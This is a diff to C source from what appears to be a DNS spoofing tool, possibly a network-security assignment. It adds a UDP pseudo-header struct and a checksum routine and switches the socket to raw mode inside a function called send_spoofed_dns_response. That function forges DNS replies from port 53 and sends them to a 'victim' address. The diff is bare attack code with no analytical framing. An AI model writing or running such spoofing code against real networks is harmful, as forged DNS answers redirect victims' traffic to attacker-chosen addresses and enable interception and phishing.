@@ -67,6 +67,14 @@ typedef struct __attribute__((packed, aligned(1))) dns_response {
 	uint32_t	ip;
 } dns_response;
 
+typedef struct __attribute__((packed, aligned(1))) chksum_hdr {
+	uint32_t	src_ip;
+	uint32_t	dst_ip;
+	uint8_t		reserved;
+	uint8_t		protocol;
+	uint16_t	len;	
+} chksum_hdr;
+
 void
 print_payload( u_char	*ptr,
 	       int	len) {
@@ -93,6 +101,34 @@ print_payload( u_char	*ptr,
 
 }
 
+/*
+    Generic checksum calculation function
+*/
+unsigned short csum(unsigned short *ptr,int nbytes) 
+{
+	register long sum;
+	unsigned short oddbyte;
+	register short answer;
+ 
+	sum=0;
+	while(nbytes>1) {
+		sum+=*ptr++;
+		nbytes-=2;
+	}
+	
+	if(nbytes==1) {
+		oddbyte=0;
+		*((u_char*)&oddbyte)=*(u_char*)ptr;
+		sum+=oddbyte;
+	}
+ 
+	sum = (sum>>16)+(sum & 0xffff);
+	sum = sum + (sum>>16);
+	answer=(short)~sum;
+
+	return(answer);
+}
+
 int
 send_spoofed_dns_response(u_char	*dns_req,
 			  char		*target_ip,
@@ -107,7 +143,8 @@ send_spoofed_dns_response(u_char	*dns_req,
 	int			soc = 0, status = -1;
 	struct sockaddr_in 	victim_addr;
 	char			temp[INET_ADDRSTRLEN];
-
+	struct chksum_hdr	hdr;
+	char			check_sum[1000];
 
 	memset(dns_res, 0, sizeof(dns_res));
 	memcpy(dns_res, dns_req, len);
@@ -129,7 +166,7 @@ send_spoofed_dns_response(u_char	*dns_req,
 	printf("\nSpoofed response:\n");
 	print_payload(dns_res, len + sizeof(dns_response));
 
-	soc = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+	soc = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
 	if (soc < 0) {
 		printf("\nUnable to create UDP raw socket = %d\n", soc);
 		return -1;
@@ -139,12 +176,14 @@ send_spoofed_dns_response(u_char	*dns_req,
 	udp->sport = htons(53);
 	udp->dport = dest_port;
 	udp->len = htons(len + sizeof(dns_response) + 8);
+	// ===============
 	udp->crc = 0;
+	// ===============
 	memcpy(packet + 8, dns_res, len + sizeof(dns_response));
 
         printf("\nTotal packet:\n");
         print_payload(packet, len + sizeof(dns_response) + 8);
-
+	
 	bzero((char *) &victim_addr, sizeof(victim_addr));
     	victim_addr.sin_family = AF_INET;
     	victim_addr.sin_port = dest_port;
